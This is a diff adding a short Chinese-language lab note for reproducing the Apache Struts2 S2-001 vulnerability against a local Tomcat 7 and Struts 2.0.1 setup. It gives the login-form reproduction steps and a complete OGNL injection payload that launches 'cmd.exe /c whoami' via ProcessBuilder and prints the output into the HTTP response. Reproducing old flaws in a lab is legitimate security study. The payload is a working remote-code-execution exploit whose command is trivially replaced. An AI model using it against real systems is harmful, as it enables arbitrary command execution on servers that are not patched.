@@ -1,0 +1,18 @@
+http://struts.apache.org/docs/s2-001.html
+简单来说是在提交表单失败后，服务器会返回之前的页面，此时可能将提交的信息保留在页面上，由于返回信息经过处理，可能触发表达式执行
+具体请看http://www.jianshu.com/p/82b776c51882的复现部分
+
+复现方式
+打开工程下的http://localhost:18080/struts2-blank-2.0.1/example/Login.action
+用户名输入POC，密码为空，可以触发漏洞执行条件
+
+POC：
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cmd.exe", "/c", "whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+
+
+
+
+搭建环境
+tomcat 7.0.82
+struts 2.0.1
+使用eclipse创建工程,struts2即为工程文件
